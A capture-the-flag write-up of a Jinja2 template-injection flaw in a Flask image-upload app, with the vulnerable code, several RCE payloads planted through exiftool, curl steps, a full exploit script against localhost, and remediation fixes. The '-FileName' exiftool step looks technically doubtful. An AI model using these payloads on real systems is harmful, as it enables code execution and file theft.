# CDN Challenge - Vulnerability Analysis

## Summary

The application contains a **Server-Side Template Injection (SSTI)** vulnerability in the post viewing functionality that allows Remote Code Execution (RCE) and arbitrary file reading, enabling extraction of the flag from `/flag.txt`.

## Vulnerability Details

### Location

File: `chall/app.py`, Function: `view_post()`, Lines 228-259

### Vulnerable Code

```python
@app.route("/post/<int:pid>")
@login_required
def view_post(pid):
    user = current_user()
    db = get_db()
    cur = db.execute(
        "SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id WHERE p.id = ? AND p.user_id = ?",
        (pid, user["id"]),
    )
    post = cur.fetchone()
    if not post:
        abort(404)
    if request.args.get("meta") == "1":
        return Response((post["metadata"] or ""), mimetype="text/plain")
    metadata_full = post["metadata"] or ""
    md_map = {"File Name": "", "Date Created": ""}
    for m in re.finditer(r"^\s*(File Name|Date Created)\s*:\s*(.*)$", metadata_full, flags=re.MULTILINE):
        key = m.group(1)
        val = m.group(2).strip()
        md_map[key] = val
    file_name_val = md_map["File Name"]
    date_created_val = md_map["Date Created"]
    # VULNERABLE: User-controlled data inserted directly into HTML without escaping
    metadata_snippet_html = f"<pre>File Name: {file_name_val}\nDate Created: {date_created_val}</pre>"
    tpl_path = os.path.join(APP_DIR, "templates", "view_post.html")
    with open(tpl_path, "r", encoding="utf-8") as fh:
        tpl_src = fh.read()
    placeholder = "{{ metadata_snippet or '' }}"
    if placeholder not in tpl_src:
        page_src = tpl_src + "\n" + metadata_snippet_html
    else:
        # VULNERABLE: Unescaped user data injected into template
        page_src = tpl_src.replace(placeholder, metadata_snippet_html)
    # VULNERABLE: Template rendered with render_template_string, executing injected Jinja2 code
    return render_template_string(page_src, post=post)
```

### Root Cause

1. **User-Controlled Input**: The metadata is extracted from uploaded images using `exiftool` and stored in the database
2. **No Sanitization**: The "File Name" and "Date Created" values from EXIF metadata are extracted and used without any escaping or sanitization
3. **String Interpolation into Template**: These values are directly inserted into an HTML string using f-strings
4. **Dynamic Template Rendering**: The modified template is rendered using `render_template_string()`, which processes Jinja2 template syntax

### Attack Vector

An attacker can:

1. Create/modify an image file to include malicious EXIF metadata containing Jinja2 template syntax
2. Upload this image through the `/upload` endpoint
3. View the post, triggering the SSTI vulnerability
4. Execute arbitrary Python code through Jinja2 template injection
5. Read the flag from `/flag.txt`

## Exploitation Steps

### Step 1: Create Malicious Image with EXIF Data

Use `exiftool` to inject Jinja2 payload into image metadata:

```bash
# Create a simple test image
convert -size 100x100 xc:white test.png

# Inject malicious EXIF data with Jinja2 SSTI payload
# Payload to read /flag.txt:
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}' test.png

# Alternative payloads:
# Simple test to verify SSTI:
exiftool -FileName='{{ 7*7 }}' test.png

# Read file using open():
exiftool -FileName='{{ get_flashed_messages.__globals__.__builtins__.open("/flag.txt").read() }}' test.png

# Using config object:
exiftool -FileName='{{ config.__class__.__init__.__globals__["os"].popen("cat /flag.txt").read() }}' test.png
```

### Step 2: Register and Login

```bash
# Register a new account
curl -X POST http://localhost:4500/register \
  -d "username=attacker&password=password123"

# Login to get session cookie
curl -X POST http://localhost:4500/login \
  -d "username=attacker&password=password123" \
  -c cookies.txt
```

### Step 3: Upload Malicious Image

```bash
# Upload the image with malicious EXIF data
curl -X POST http://localhost:4500/upload \
  -b cookies.txt \
  -F "title=Exploit" \
  -F "image=@test.png"
```

### Step 4: Trigger SSTI

```bash
# View the post (get post ID from upload response or gallery)
curl http://localhost:4500/post/1 -b cookies.txt
```

The flag will be rendered in the HTML response where the "File Name" metadata is displayed.

## Alternative Payloads

### 1. Using Date Created field instead

```bash
exiftool -DateCreated='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}' test.png
```

### 2. RCE with subprocess

```python
{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["__builtins__"]["__import__"]("subprocess").check_output("cat /flag.txt", shell=True).decode() }}
```

### 3. Using lipsum global

```python
{{ lipsum.__globals__.os.popen("cat /flag.txt").read() }}
```

### 4. Using cycler (common Jinja2 global)

```python
{{ cycler.__init__.__globals__.os.popen("cat /flag.txt").read() }}
```

### 5. Accessing current_app

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

## Complete Exploitation Script

```python
#!/usr/bin/env python3
import requests
import tempfile
import subprocess
from pathlib import Path

TARGET = "http://localhost:4500"
USERNAME = "attacker123"
PASSWORD = "password123"

def create_malicious_image(payload):
    """Create an image with malicious EXIF data"""
    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
        tmp_path = tmp.name

    # Create a simple white image
    subprocess.run(['convert', '-size', '100x100', 'xc:white', tmp_path], check=True)

    # Inject malicious EXIF data
    subprocess.run(['exiftool', '-FileName=' + payload, tmp_path], check=True)

    # Remove the backup file created by exiftool
    backup = tmp_path + '_original'
    if Path(backup).exists():
        Path(backup).unlink()

    return tmp_path

def exploit():
    session = requests.Session()

    # Register
    print("[*] Registering user...")
    r = session.post(f"{TARGET}/register", data={
        "username": USERNAME,
        "password": PASSWORD
    })

    # Login
    print("[*] Logging in...")
    r = session.post(f"{TARGET}/login", data={
        "username": USERNAME,
        "password": PASSWORD
    })

    if "Welcome" not in r.text:
        print("[-] Login failed")
        return

    # Create malicious image
    print("[*] Creating malicious image...")
    payload = '{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}'
    img_path = create_malicious_image(payload)

    # Upload image
    print("[*] Uploading malicious image...")
    with open(img_path, 'rb') as f:
        r = session.post(f"{TARGET}/upload",
            data={"title": "Exploit"},
            files={"image": ("exploit.png", f, "image/png")}
        )

    # Get post ID from gallery
    print("[*] Getting post ID...")
    r = session.get(f"{TARGET}/gallery")
    import re
    post_ids = re.findall(r'/post/(\d+)', r.text)

    if not post_ids:
        print("[-] No posts found")
        return

    post_id = post_ids[0]

    # Trigger SSTI
    print(f"[*] Triggering SSTI on post {post_id}...")
    r = session.get(f"{TARGET}/post/{post_id}")

    # Extract flag from response
    print("\n[+] Response:")
    print(r.text)

    # Clean up
    Path(img_path).unlink()

    # Try to extract flag
    flag_match = re.search(r'GEMASTIK\{[^}]+\}', r.text)
    if flag_match:
        print(f"\n[+] FLAG FOUND: {flag_match.group()}")
    else:
        print("\n[*] Flag not found in response, check output above")

if __name__ == "__main__":
    exploit()
```

## Impact

- **Severity**: CRITICAL
- **Impact**: Remote Code Execution (RCE)
- **Attacker Requirements**: Valid user account (registration is open)
- **Exploitation Difficulty**: Medium

## Remediation

### Fix 1: Don't use render_template_string with user data

Replace `render_template_string` with regular `render_template` and pass the metadata as a variable:

```python
@app.route("/post/<int:pid>")
@login_required
def view_post(pid):
    user = current_user()
    db = get_db()
    cur = db.execute(
        "SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id WHERE p.id = ? AND p.user_id = ?",
        (pid, user["id"]),
    )
    post = cur.fetchone()
    if not post:
        abort(404)
    if request.args.get("meta") == "1":
        return Response((post["metadata"] or ""), mimetype="text/plain")
    metadata_full = post["metadata"] or ""
    md_map = {"File Name": "", "Date Created": ""}
    for m in re.finditer(r"^\s*(File Name|Date Created)\s*:\s*(.*)$", metadata_full, flags=re.MULTILINE):
        key = m.group(1)
        val = m.group(2).strip()
        md_map[key] = val

    # Pass metadata as template variables instead of injecting into template
    return render_template("view_post.html", post=post, metadata=md_map)
```

### Fix 2: Escape HTML in metadata

If you must use render_template_string, escape the user data:

```python
from markupsafe import escape

file_name_val = escape(md_map["File Name"])
date_created_val = escape(md_map["Date Created"])
metadata_snippet_html = f"<pre>File Name: {file_name_val}\nDate Created: {date_created_val}</pre>"
```

### Fix 3: Use autoescape

Enable autoescape for render_template_string:

```python
from jinja2 import Environment

env = Environment(autoescape=True)
template = env.from_string(page_src)
return template.render(post=post)
```

## References

- [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Flask Documentation - render_template_string](https://flask.palletsprojects.com/en/2.3.x/api/#flask.render_template_string)

